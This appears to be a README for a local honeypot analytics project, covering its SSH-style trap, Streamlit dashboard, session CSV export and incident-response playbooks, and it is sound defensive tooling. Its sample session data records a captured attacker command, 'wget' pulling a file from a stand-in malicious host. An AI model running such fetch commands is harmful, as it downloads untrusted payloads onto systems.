# 🎯 Honeypot Analytics Dashboard — Complete System

**Status**: ✅ **FULLY OPERATIONAL**

A professional honeypot analytics platform with:
- 🚨 Real-time attack detection and classification
- 📊 Interactive Streamlit dashboard with 6 analysis tabs
- 🛠️ Priority-ranked incident response playbooks
- 📥 Session data aggregation and CSV export
- 🎓 Professional remediation step-by-step guides

---

## 🚀 Start Here — One Command

### Windows (Batch Script)
```cmd
cd C:\project
run_demo.bat
```
This will:
1. Start honeypot server (port 2222)
2. Start Streamlit dashboard (port 8501)
3. Create sample attack session
4. Open browser to http://localhost:8501

### Alternative: Manual Steps
```powershell
# Terminal 1: Honeypot
python -m src.orchestrator_runner

# Terminal 2: Dashboard
streamlit run app_auto.py --server.port 8501 --server.address 127.0.0.1

# Terminal 3: Generate data
python test_client_interactive.py
```

Then open: **http://127.0.0.1:8501**

---

## 📊 Dashboard Overview

### 7 Tabs for Complete Analysis

| Tab | Purpose | Output |
|-----|---------|--------|
| **Overview** | Key metrics snapshot | Total sessions, unique IPs, attack counts |
| **Attack Types** | Attack classification | Bar chart: recon, exploit, malware, bruteforce |
| **Ports** | Target analysis | Top 20 destination ports |
| **Timeline** | Temporal patterns | Hourly session frequency |
| **Geography** | Origin analysis | Country of attacker (or LOCAL for testing) |
| **🎯 Attack Insights** | **Incident response** | **Priority-ranked remediation + download checklist** |
| **Raw Data** | Full details | Complete session metadata table |

---

## 🛠️ Attack Insights — The Key Feature

Click the **"Attack Insights"** tab to:

1. **Select an attack type** (recon, exploit, malware, bruteforce, etc.)
2. **View the breakdown:**
   - What happened (attack description)
   - How they got in (attack vector)
   - Severity level

3. **See priority-ranked remediation steps:**
   - 🔴 HIGH priority actions (do first)
   - 🟡 MEDIUM priority actions (do next)
   - Exact bash/PowerShell commands
   - Why each step matters

4. **Download incident response checklist** as text file for your team

Example output:
```
INCIDENT RESPONSE CHECKLIST
Attack Type: EXPLOIT
Sessions Affected: 3

1. [  ] Immediately patch vulnerable software
   Commands:
   $ apt-get update && apt-get upgrade
   $ systemctl restart affected-service

2. [  ] Block payload delivery URLs
   Commands:
   $ iptables -A OUTPUT -d malicious.example -j DROP

...and more...
```

---

## 📁 Project Structure

```
C:\project/
├── run_demo.bat                 # One-click demo launcher
├── app_auto.py                  # Main Streamlit dashboard
├── test_client_interactive.py   # Creates sample sessions
│
├── src/
│   ├── orchestrator.py          # Honeypot server logic
│   ├── orchestrator_runner.py   # Module entry point
│   ├── attack_recommendations.py # Remediation playbooks
│   ├── session_manager.py       # Session handling
│   ├── classifier.py            # Attack classification
│   ├── feature_extractor.py     # Feature extraction
│   ├── interaction_engine.py    # Banner/response logic
│   ├── policy_engine.py         # Engagement decisions
│   ├── evidence_store.py        # Payload storage
│   └── ...
│
├── scripts/
│   └── aggregate.py             # Session → CSV aggregator
│
├── data/
│   └── sessions/S-1762797430/   # Individual session dir
│       └── meta.json            # Session metadata
│
├── output/
│   └── honeypot_sessions.csv    # Canonical CSV (auto-generated)
│
├── QUICK_START_GUIDE.md         # User guide
├── SYSTEM_FIXED_SUMMARY.md      # What was fixed
└── README.md                    # (this file)
```

---

## 🔧 How It Works

### Data Flow

1. **Honeypot** (`orchestrator_runner.py`)
   - Listens on port 2222
   - Accepts SSH banner requests
   - Records attacker commands
   - Classifies attack type via `[CLASS]=label|confidence` markers
   - Saves session metadata to `data/sessions/S-<timestamp>/meta.json`

2. **Session Aggregator** (`scripts/aggregate.py`)
   - Reads all `meta.json` files from `data/sessions/`
   - Normalizes data types (integers, timestamps, strings)
   - Extracts attack type from event markers
   - Writes canonical CSV to `output/honeypot_sessions.csv`

3. **Dashboard** (`app_auto.py`)
   - Loads CSV or reads live sessions
   - Normalizes and enriches (GeoIP country lookup)
   - Renders 6 analysis tabs
   - Displays incident response recommendations
   - Provides CSV/Excel/PNG export

---

## 📝 Key Features

### ✅ Real Data Handling
- Reads actual honeypot session metadata from `data/sessions/`
- 16+ sample sessions included for demo
- Properly parses event JSON and extracts attack types

### ✅ Professional Incident Response
- 5 attack type categories with full remediation playbooks:
  - **Recon**: Network mapping, port scans
  - **Exploit**: Payload delivery, vulnerability exploitation
  - **Bruteforce**: Credential guessing attacks
  - **Malware**: Ransomware, C2 communications
  - **Unknown**: Investigate & classify

- Each category includes:
  - Title, description, severity level
  - Attack vector explanation
  - 4-6 priority-ranked actions
  - Exact commands to execute
  - Reasoning for each step

### ✅ No VM Required
- Single-machine setup (Windows/Linux/Mac)
- `run_demo.bat` handles everything
- Works on enterprise Windows with Group Policy restrictions

### ✅ Export Options
- CSV export of all sessions
- Excel workbook with multiple sheets
- PNG charts (with Plotly/Kaleido)
- Incident response checklist (text file)

---

## 🎯 For Presentations

### What to Show

1. **Run the demo:**
   ```cmd
   run_demo.bat
   ```
   Takes ~5 seconds to start everything

2. **Show the dashboard:**
   - Open http://127.0.0.1:8501
   - Scroll through metrics (total sessions, attack types)
   - Click "Attack Insights" tab

3. **Select an attack type:**
   - Show the detailed breakdown
   - Point out priority-ranked actions
   - Demonstrate the bash commands

4. **Download the checklist:**
   - Shows as text file with checkboxes
   - Proves the incident response workflow

5. **Export the data:**
   - Show CSV, Excel, or JSON exports
   - Demonstrates data portability

### Example Talking Points

- **"This honeypot captured 16 attack sessions across 5 different attack types."**
- **"For each attack, the system provides priority-ranked remediation steps with exact commands."**
- **"Security teams can download the incident response checklist and follow the steps."**
- **"The dashboard is real-time and auto-updates as new attacks arrive."**

---

## 🔍 Understanding the Data

### Sample Session Metadata

```json
{
  "session_id": "S-1762797430",
  "src_ip": "127.0.0.1",
  "src_port": 55184,
  "start_ts": 1762797430.0324984,
  "events": [
    {
      "ts": 1762797430.0374017,
      "text": "wget http://malicious.example/x"
    },
    {
      "ts": 1762797430.072256,
      "text": "[CLASS]=recon|0.6|ENG=HIGH"
    },
    {
      "ts": 1762797432.0380263,
      "text": "ATTACKER_CMD: ls -la"
    }
  ],
  "end_time": "Mon Nov 10 23:27:12 2025"
}
```

### CSV Output

```csv
session_id,src_ip,src_port,timestamp,events,dst_port,instance,attack_type,src_country
S-1762797430,127.0.0.1,55184,2025-11-10T23:27:12,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,recon,LOCAL
```

The dashboard uses this CSV to generate all visualizations.

---

## 🚨 Troubleshooting

### Problem: "No dataset loaded"
**Solution:**
1. Ensure `python -m src.orchestrator_runner` is running
2. Run `python test_client_interactive.py` to create a session
3. Refresh browser (Ctrl+F5)

### Problem: "Could not connect to honeypot"
**Check:**
```powershell
netstat -ano | findstr :2222
# Should show: 127.0.0.1:2222 LISTENING
```

If nothing shows, start the orchestrator:
```powershell
python -m src.orchestrator_runner
```

### Problem: Streamlit won't load
**Check:**
- Use http://127.0.0.1:8501 (NOT 0.0.0.0)
- Check port isn't blocked: `netstat -ano | findstr :8501`
- Restart: `Stop-Process -Name python -Force`

---

## 📚 Documentation

| File | Purpose |
|------|---------|
| **QUICK_START_GUIDE.md** | Step-by-step user guide |
| **SYSTEM_FIXED_SUMMARY.md** | What was fixed and how |
| **README.md** | (this file) Overview |

---

## 💡 Key Takeaways

✅ **Works out of the box** — Just run `run_demo.bat`

✅ **Professional incident response** — Detailed playbooks for each attack type

✅ **No VM knowledge needed** — Local setup on Windows/Linux/Mac

✅ **Export-ready** — CSV, Excel, PNG, or checklist formats

✅ **Demo-friendly** — Impressive visuals for presentations

---

## 🎓 Next Steps

1. **Run the demo:** `run_demo.bat`
2. **Explore the dashboard:** http://127.0.0.1:8501
3. **Check the Attack Insights tab** for detailed remediation
4. **Download the incident response checklist**
5. **Show it to your team!**

---

**Questions?** See QUICK_START_GUIDE.md or SYSTEM_FIXED_SUMMARY.md

**Ready to go!** 🚀
